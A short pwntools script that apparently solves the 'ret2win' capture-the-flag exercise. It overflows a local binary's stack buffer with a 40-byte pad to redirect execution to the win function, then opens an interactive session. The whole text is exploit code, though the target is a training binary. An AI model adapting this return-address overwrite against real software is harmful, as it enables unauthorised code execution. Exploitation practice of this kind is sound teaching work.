from pwn import *

r = process('./ret2win')

exe = context.binary = ELF('ret2win', checksec=False)

offset = 40

win = exe.sym['ret2win']

payload = flat(
    b'A' * offset,
    win,
    exe.sym['main']
)  

r.sendline(payload)
r.interactive()